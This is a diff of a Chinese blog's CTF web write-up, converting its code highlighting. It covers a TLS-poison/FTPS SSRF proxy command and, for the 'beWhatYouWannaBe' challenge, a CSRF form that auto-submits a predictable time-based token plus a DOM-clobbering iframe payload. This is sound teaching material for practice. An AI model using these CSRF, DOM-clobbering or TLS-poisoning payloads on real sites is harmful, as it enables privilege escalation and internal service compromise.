+<span class="token keyword">with</span> socketserver<span class="token punctuation">.</span>TCPServer<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> MyTCPHandler<span class="token punctuation">)</span> <span class="token keyword">as</span> server<span class="token punctuation">:</span>
+    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start..."</span><span class="token punctuation">)</span>
+        server<span class="token punctuation">.</span>handle_request<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"stop"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"OK"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"END...."</span><span class="token punctuation">)</span>
+        <span class="token comment"># exit()</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>首先启动TLS的代理服务器，使用<a target="_blank" rel="noopener" href="https://github.com/ZeddYu/TLS-poison/">工具</a>设置好了之后，导入证书私钥通过一下命令打开代理</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TLS-poison/client-hello-poisoning/custom-tls/target/debug/custom-tls -p 11211 --certs /home/ubuntu/tls/fullchain.pem --key /home/ubuntu/tls/privkey.pem forward 2048</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">TLS-poison&#x2F;client-hello-poisoning&#x2F;custom-tls&#x2F;target&#x2F;debug&#x2F;custom-tls -p 11211 --certs &#x2F;home&#x2F;ubuntu&#x2F;tls&#x2F;fullchain.pem --key &#x2F;home&#x2F;ubuntu&#x2F;tls&#x2F;privkey.pem forward 2048<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>此时我们发往11211端口的带TLS的请求就会被解密并转发到2048端口，由于这个工具通过读取redis中的payload来传输数据，所以我们要先将payload存入redis，然后让受害者对我们服务器的11211端口发起FTPS请求，此时我们伪造的服务器会让受害者的服务器到127.0.0.1:11200去获取ftp传输的数据，进行TLS复用，数据被注入</p>
 <p><del>后面就是赛后复盘的了</del></p>
 <h2 id="beWhatYouWannaBe"><a href="#beWhatYouWannaBe" class="headerlink" title="beWhatYouWannaBe"></a>beWhatYouWannaBe</h2><p>首先P1通过CSRF获取admin，并且此处的Token值可计算</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> ValidateToken = <span class="function">(<span class="params">Token</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> sha256 = crypto.createHash(<span class="string">&#x27;sha256&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> sha256.update(<span class="built_in">Math</span>.sin(<span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>)).toString()).digest(<span class="string">&#x27;hex&#x27;</span>) === Token;</span><br><span class="line">&#125;</span><br><span class="line">app.post(<span class="string">&#x27;/beAdmin&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.session.user != <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        res.send(<span class="string">&quot;sorry, only admin can be admin&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> username = req.body.username</span><br><span class="line">    <span class="keyword">const</span> csrftoken = req.body.csrftoken</span><br><span class="line">    <span class="keyword">if</span> (ValidateToken(csrftoken)) &#123;</span><br><span class="line">        User.updateMany(&#123; <span class="attr">username</span>: username &#125;, &#123; <span class="attr">isAdmin</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">            <span class="function">(<span class="params">err, users</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    res.send(<span class="string">&#x27;something error when being admin&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (users.length == <span class="number">0</span>) &#123;</span><br><span class="line">                    res.send(<span class="string">&#x27;no one can be admin&#x27;</span>)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    res.send(<span class="string">&#x27;wow success wow&#x27;</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        )</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.send(<span class="string">&#x27;validate error&#x27;</span>)<span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">ValidateToken</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">Token</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">var</span> sha256 <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> sha256<span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token operator">===</span> Token<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/beAdmin'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">!=</span> <span class="token string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"sorry, only admin can be admin"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">const</span> username <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>username
+    <span class="token keyword">const</span> csrftoken <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>csrftoken
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ValidateToken</span><span class="token punctuation">(</span>csrftoken<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        User<span class="token punctuation">.</span><span class="token function">updateMany</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">username</span><span class="token operator">:</span> username <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">isAdmin</span><span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
+            <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> users</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'something error when being admin'</span><span class="token punctuation">)</span>
+                    <span class="token keyword">return</span>
+                <span class="token punctuation">&#125;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>users<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no one can be admin'</span><span class="token punctuation">)</span>
+                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+                    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'wow success wow'</span><span class="token punctuation">)</span>
+                <span class="token punctuation">&#125;</span>
+            <span class="token punctuation">&#125;</span>
+        <span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'validate error'</span><span class="token punctuation">)</span><span class="token number">3</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>获取P1的js构造如下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8000/beAdmin&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span> </span><br><span class="line">   	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;J1an&quot;</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;csrftoken&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrftoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  	<span class="keyword">var</span> a=CryptoJS.SHA256(<span class="built_in">Math</span>.sin(<span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>)).toString()).toString();</span></span><br><span class="line"><span class="javascript"> 		csrftoken.value=a;</span></span><br><span class="line"><span class="javascript">  	form.submit();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8000/beAdmin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
+   	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>J1an<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+   	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  	<span class="token keyword">var</span> a<span class="token operator">=</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">SHA256</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 		csrftoken<span class="token punctuation">.</span>value<span class="token operator">=</span>a<span class="token punctuation">;</span>
+  	form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>再来看P2</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.setJavaScriptEnabled(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">await</span> page.goto(url, &#123; <span class="attr">timeout</span>: <span class="number">5000</span> &#125;)</span><br><span class="line"><span class="keyword">const</span> data = <span class="keyword">await</span> page.evaluate(<span class="function">(<span class="params">url, FLAG</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fff.lll.aaa.ggg.value == <span class="string">&quot;this_is_what_i_want&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> fetch(url + <span class="string">&#x27;?part2=&#x27;</span> + btoa(<span class="built_in">encodeURIComponent</span>(FLAG.substring(<span class="number">16</span>))));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fetch(url + <span class="string">&#x27;?there_is_no_flag&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;, url, FLAG)</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">setJavaScriptEnabled</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
+<span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">evaluate</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">url<span class="token punctuation">,</span> <span class="token constant">FLAG</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>fff<span class="token punctuation">.</span>lll<span class="token punctuation">.</span>aaa<span class="token punctuation">.</span>ggg<span class="token punctuation">.</span>value <span class="token operator">==</span> <span class="token string">"this_is_what_i_want"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?part2='</span> <span class="token operator">+</span> <span class="token function">btoa</span><span class="token punctuation">(</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span><span class="token constant">FLAG</span><span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token function">fetch</span><span class="token punctuation">(</span>url <span class="token operator">+</span> <span class="token string">'?there_is_no_flag'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> <span class="token constant">FLAG</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>说白了就是构造一个html使得<code>fff.lll.aaa.ggg.value == &quot;this_is_what_i_want&quot;</code>，使用<a target="_blank" rel="noopener" href="https://portswigger.net/research/dom-clobbering-strikes-back">这个</a>小trick来嵌套构造元素，最终两者拼接构造出的html如下</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">fff</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;form id=lll name=aaa&gt;&lt;input name=ggg value=this_is_what_i_want&gt;&lt;/form&gt;&lt;form id=lll&gt;&lt;/form&gt;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://localhost:8000/beAdmin&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span> </span><br><span class="line">   	<span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;J1an&quot;</span>&gt;</span></span><br><span class="line">   	<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;csrftoken&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrftoken&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">  	<span class="keyword">var</span> a=CryptoJS.SHA256(<span class="built_in">Math</span>.sin(<span class="built_in">Math</span>.floor(<span class="built_in">Date</span>.now() / <span class="number">1000</span>)).toString()).toString();</span></span><br><span class="line"><span class="javascript"> 		csrftoken.value=a;</span></span><br><span class="line"><span class="javascript">  	form.submit();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>fff</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;form id=lll name=aaa>&lt;input name=ggg value=this_is_what_i_want>&lt;/form>&lt;form id=lll>&lt;/form><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://localhost:8000/beAdmin<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
+   	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>J1an<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+   	<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>csrftoken<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/crypto-js@4.0.0/crypto-js.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  	<span class="token keyword">var</span> a<span class="token operator">=</span>CryptoJS<span class="token punctuation">.</span><span class="token constant">SHA256</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sin</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Date<span class="token punctuation">.</span><span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+ 		csrftoken<span class="token punctuation">.</span>value<span class="token operator">=</span>a<span class="token punctuation">;</span>
+  	form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="poorui"><a href="#poorui" class="headerlink" title="poorui"></a>poorui</h2><p>基本全是非预期吧，登录flag去找flagbot要就行了ss</p>
 <script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">
@@ -457,7 +526,7 @@ CVE-2017-17562
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -480,7 +549,7 @@ CVE-2017-17562
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -523,39 +592,6 @@ CVE-2017-17562
 
                 </div>
             </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
